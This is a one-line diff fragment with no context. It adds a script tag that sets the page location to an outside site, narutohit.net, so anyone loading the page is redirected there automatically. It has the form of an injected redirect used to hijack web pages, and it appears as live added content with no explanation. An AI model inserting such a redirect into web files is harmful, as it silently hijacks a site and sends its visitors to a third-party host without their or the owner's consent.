@@ -1,0 +1,1 @@
+<script>self.location='http://www.narutohit.net/?p=home'</script>
